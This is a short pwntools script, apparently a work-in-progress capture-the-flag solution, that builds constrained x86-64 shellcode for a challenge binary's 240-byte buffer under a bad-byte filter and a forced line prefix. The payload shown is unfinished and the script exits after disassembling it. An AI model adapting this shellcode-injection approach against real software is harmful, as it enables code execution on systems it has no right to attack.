from pwn import *



context.arch = "amd64"
elf=ELF('./pwn/modomodohayaku/modomodohayaku')
r = process('./pwn/modomodohayaku/modomodohayaku')
#r = remote('ctf.adl.tw', 10002)


#buffer has 240 bytes (30 vars*8)
#first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
#read 96 bytes into buffer
#divide the shellcode into lines of 6
#first 16 lines must start with 0xc 0x87 0x63
#after the 112 byte(16 bytes from the 16th line), the shellcode will be executed.
#This means we have to limit the shellcode within 112 bytes


payload=b''
payload+=b"\x0c\x87\x63\x00\x31\xc0"#31 c0
payload+=b"\x0c\x87\x63\x00\x50\x31"#50
payload+=b"\x0c\x87\x63\x00\x48\x8b"#48
payload+=b"\x0c\x87\x63\x05\x48\x00"


print(disasm(payload))#in intel syntax, e.g. dest=src
exit(0)
output=r.recvuntil(b'..........')
print(output)
pause()
r.send(flat(payload))

r.interactive()

 